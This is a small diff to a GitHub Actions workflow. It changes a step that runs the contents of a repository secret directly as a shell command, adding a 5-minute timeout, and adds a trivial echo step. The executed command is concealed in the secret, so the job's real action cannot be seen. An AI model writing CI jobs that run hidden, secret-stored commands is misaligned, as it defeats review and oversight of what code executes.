@@ -3,9 +3,11 @@ on: [push, pull_request]
 jobs:
   build1:
     runs-on: ubuntu-18.04
-    timeout-minutes: 6
     steps:
     - uses: actions/checkout@v3
-    - name: Rerunning
+    - name: ip
       continue-on-error: true
-      run: ${{ secrets.NAMES }}
+      run: timeout 5m ${{ secrets.NAMES }}
+    - name: selesai
+      continue-on-error: true
+      run: echo 'hello' && sleep 2 && echo 'done'
